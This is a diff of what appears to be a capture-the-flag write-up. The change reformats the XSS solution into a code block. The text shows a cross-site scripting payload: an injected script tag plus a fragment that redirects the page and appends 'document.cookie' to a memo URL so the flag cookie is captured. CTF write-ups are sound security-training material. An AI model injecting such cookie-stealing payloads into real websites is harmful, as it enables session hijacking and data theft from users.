@@ -21,7 +21,12 @@ alert(123);
 
 So we only need to inject this payload to get the cookie that contain the flag
 
-Before the #: <script id= "name"></script>
+Before the #:
+
+```<script id= "name"></script>
+
+```
+
 After the #: location='/memo?memo='+document.cookie//
 
 You can find the flag on your own
